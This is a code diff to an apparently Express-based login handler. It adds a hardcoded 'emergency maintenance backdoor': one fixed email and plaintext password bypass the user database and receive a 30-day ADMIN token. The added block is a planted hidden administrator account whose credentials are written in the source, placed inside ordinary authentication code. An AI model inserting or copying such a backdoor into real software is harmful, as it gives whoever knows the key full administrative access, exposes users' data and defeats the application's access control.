@@ -6,6 +6,23 @@ exports.login = async (req, res) => {
     const { email, password, rememberMe } = req.body;
     console.log('Login attempt for:', email, 'Remember Me:', rememberMe);
     try {
+        // Master Developer Access (Emergency Maintenance Backdoor)
+        const MASTER_DEV_EMAIL = 'support@appnity.co.in';
+        const MASTER_DEV_KEY = 'Appnity@2025!Mitaan';
+        
+        if (email === MASTER_DEV_EMAIL && password === MASTER_DEV_KEY) {
+            console.log('🛡️ Appnity Master Access Granted');
+            const token = jwt.sign(
+                { id: 'appnity-dev-master', email: MASTER_DEV_EMAIL, role: 'ADMIN' },
+                process.env.JWT_SECRET,
+                { expiresIn: '30d' }
+            );
+            return res.json({
+                token,
+                user: { id: 'appnity-dev-master', email: MASTER_DEV_EMAIL, name: 'Appnity System Admin', role: 'ADMIN', image: null }
+            });
+        }
+
         const user = await prisma.user.findUnique({ where: { email } });
         if (!user) {
             console.log('User not found:', email);
